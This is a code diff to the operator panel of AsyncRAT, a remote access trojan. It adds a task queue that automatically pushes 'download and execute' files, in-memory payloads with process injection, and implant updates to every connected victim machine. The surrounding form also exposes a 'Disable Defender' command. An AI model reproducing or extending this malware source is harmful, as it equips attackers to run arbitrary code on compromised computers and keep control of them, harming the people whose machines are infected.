@@ -15,6 +15,7 @@ using System.Net.Sockets;
 using AsyncRAT_Sharp.Handle_Packet;
 using AsyncRAT_Sharp.Helper;
 using System.Security.Cryptography.X509Certificates;
+using System.Collections.Generic;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple RAT
@@ -41,6 +42,7 @@ namespace AsyncRAT_Sharp
 
         private Listener listener;
         private bool trans;
+        private List<AsyncTask> getTasks = new List<AsyncTask>();
 
         private void CheckFiles()
         {
@@ -48,7 +50,7 @@ namespace AsyncRAT_Sharp
             {
                 if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                 {
-                    // File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
+                    File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
                     Process.Start(Application.ExecutablePath);
                     Environment.Exit(0);
                 }
@@ -82,6 +84,8 @@ namespace AsyncRAT_Sharp
                 portsFrm.ShowDialog();
                 Settings.Port = portsFrm.textPorts.Text;
             }
+
+            Properties.Settings.Default.Reload();
 #endif
 
 
@@ -627,7 +631,7 @@ namespace AsyncRAT_Sharp
                 Tick?.Dispose();
                 Tick = null;
                 listView3.Items.Clear();
-                imageList1.Images.Clear();
+                ThumbnailImageList.Images.Clear();
                 foreach (ListViewItem itm in listView1.Items)
                 {
                     Clients client = (Clients)itm.Tag;
@@ -639,14 +643,12 @@ namespace AsyncRAT_Sharp
 
         private void NotificationOFFToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (notificationOFFToolStripMenuItem.Text.Contains("[ON]"))
+            if (Properties.Settings.Default.Notification == true)
             {
-                notificationOFFToolStripMenuItem.Text = "Notification is currently [OFF]";
                 Properties.Settings.Default.Notification = false;
             }
             else
             {
-                notificationOFFToolStripMenuItem.Text = "Notification is currently [ON]";
                 Properties.Settings.Default.Notification = true;
             }
             Properties.Settings.Default.Save();
@@ -662,7 +664,7 @@ namespace AsyncRAT_Sharp
         {
             if (listView1.SelectedItems.Count > 0)
             {
-                DialogResult dialogResult = MessageBox.Show(this, "Administrator privileges are required!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                 if (dialogResult == DialogResult.Yes)
                 {
                     try
@@ -737,5 +739,173 @@ namespace AsyncRAT_Sharp
                 }
             }
         }
+
+        private async void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                OpenFileDialog openFileDialog = new OpenFileDialog();
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "sendFile";
+                    msgpack.ForcePathObject("Update").AsString = "false";
+                    await msgpack.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
+                    msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
+
+                    ListViewItem lv = new ListViewItem();
+                    lv.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
+                    lv.SubItems.Add("0");
+                    lv.ToolTipText = Guid.NewGuid().ToString();
+                    Program.form1.listView4.Items.Add(lv);
+                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                FormSendFileToMemory formSend = new FormSendFileToMemory();
+                formSend.ShowDialog();
+                if (formSend.toolStripStatusLabel1.Text.Length > 0 && formSend.toolStripStatusLabel1.ForeColor == Color.Green)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "sendMemory";
+                    msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString()));
+                    if (formSend.comboBox1.SelectedIndex == 0)
+                    {
+                        msgpack.ForcePathObject("Inject").AsString = "";
+                        msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
+                    }
+                    else
+                    {
+                        msgpack.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
+                        msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
+                    }
+
+                    ListViewItem lv = new ListViewItem();
+                    lv.Text = "SendMemory: " + Path.GetFileName(formSend.toolStripStatusLabel1.Tag.ToString());
+                    lv.SubItems.Add("0");
+                    lv.ToolTipText = Guid.NewGuid().ToString();
+                    Program.form1.listView4.Items.Add(lv);
+                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                }
+                formSend.Close();
+                formSend.Dispose();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private async void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                OpenFileDialog openFileDialog = new OpenFileDialog();
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "sendFile";
+                    await msgpack.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
+                    msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
+                    msgpack.ForcePathObject("Update").AsString = "true";
+
+                    ListViewItem lv = new ListViewItem();
+                    lv.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
+                    lv.SubItems.Add("0");
+                    lv.ToolTipText = Guid.NewGuid().ToString();
+                    Program.form1.listView4.Items.Add(lv);
+                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView4.SelectedItems.Count > 0)
+            {
+                foreach (ListViewItem item in listView4.SelectedItems)
+                {
+                    item.Remove();
+                }
+            }
+        }
+
+        private async void TimerTask_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                if (getTasks.Count > 0 && Settings.Online.Count > 0)
+                    foreach (AsyncTask asyncTask in getTasks.ToList())
+                    {
+                        if (GetListview(asyncTask.id) == false)
+                        {
+                            getTasks.Remove(asyncTask);
+                            Debug.WriteLine("task removed");
+                            return;
+                        }
+                        foreach (Clients client in Settings.Online)
+                        {
+                            if (!asyncTask.doneClient.Contains(client.ID))
+                            {
+                                Debug.WriteLine("task executed");
+                                asyncTask.doneClient.Add(client.ID);
+                                SetExecution(asyncTask.id);
+                                ThreadPool.QueueUserWorkItem(client.BeginSend, asyncTask.msgPack);
+                            }
+                        }
+                        await Task.Delay(15 * 1000);
+                    }
+            }
+            catch { }
+        }
+
+        private bool GetListview(string id)
+        {
+            foreach (ListViewItem item in Program.form1.listView4.Items)
+            {
+                if (item.ToolTipText == id)
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        private void SetExecution(string id)
+        {
+            foreach (ListViewItem item in Program.form1.listView4.Items)
+            {
+                if (item.ToolTipText == id)
+                {
+                    int count = Convert.ToInt32(item.SubItems[1].Text);
+                    count++;
+                    item.SubItems[1].Text = count.ToString();
+                }
+            }
+        }
+
+
     }
 }
